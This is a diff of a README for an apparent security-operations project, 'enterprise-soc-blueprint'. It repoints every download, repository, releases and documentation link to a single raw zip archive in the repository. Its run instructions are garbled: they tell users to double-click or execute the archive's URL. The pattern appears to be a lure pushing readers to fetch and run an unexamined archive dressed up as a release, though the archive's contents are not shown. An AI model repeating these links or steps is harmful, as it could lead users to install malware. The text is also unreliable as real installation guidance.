@@ -6,7 +6,7 @@ Welcome to the enterprise-soc-blueprint! This guide will help you download and r
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip%20Latest%https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip%20Latest%https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)
 
 To get started, click the button above to visit the download page. Here, you will find the latest releases for the enterprise-soc-blueprint.
 
@@ -31,18 +31,18 @@ The enterprise-soc-blueprint provides the following features:
 ## 🌐 Download & Install
 
 1. **Visit the Releases Page**: Go to the releases page to browse available versions.  
-   [Download Latest Release](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)
 
 2. **Select a Version**: You will see a list of available versions. Each version includes notes on what has changed since the last one, so review them carefully.
 
-3. **Download the Package**: Click on the version tag to download the package. You will have options for different formats, such as zip or https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip
+3. **Download the Package**: Click on the version tag to download the package. You will have options for different formats, such as zip or https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded file and extract it to a folder of your choice.
 
 5. **Run the Application**: 
-   - For Windows users, double-click the `https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip` file.
+   - For Windows users, double-click the `https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip` file.
    - For macOS users, drag the application to your Applications folder.
-   - For Linux users, navigate to the extracted folder in the terminal and run `https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip`.
+   - For Linux users, navigate to the extracted folder in the terminal and run `https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip`.
 
 6. **Follow Setup Instructions**: The application will guide you through initial setup steps. Follow the on-screen instructions to configure your SOC.
 
@@ -78,8 +78,8 @@ Feel free to explore these technologies to enhance the functions of your SOC.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)
-- [Releases Page](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)
-- [Documentation](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/dob/enterprise-soc-blueprint.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/GhostkillerMMIX/enterprise-soc-blueprint/main/docs/architecture/soc-blueprint-enterprise-3.6-alpha.4.zip)
 
 We hope this guide helps you get started with your SOC implementation. Enjoy a more streamlined and effective security operation!
